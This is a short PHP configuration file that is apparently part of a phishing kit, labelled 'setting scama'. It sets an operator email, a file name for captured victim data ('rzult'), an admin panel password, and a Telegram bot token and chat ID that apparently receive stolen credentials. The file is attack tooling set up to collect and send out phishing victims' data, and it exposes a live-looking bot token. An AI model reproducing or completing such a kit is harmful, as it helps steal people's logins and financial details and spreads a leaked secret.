<?php
// setting scama
$yourmail  = "";  // your email 
$namerand = "c";  // name for file rzult *
$pass = "123345"; // pass admin panel
$botToken="5217847855:AAEDHT9Jt2-qCZIZJFWtZl4__yvzjfFtikw"; // token bot telegram
$chatId="-1001718838083";  // chatId telegram

?>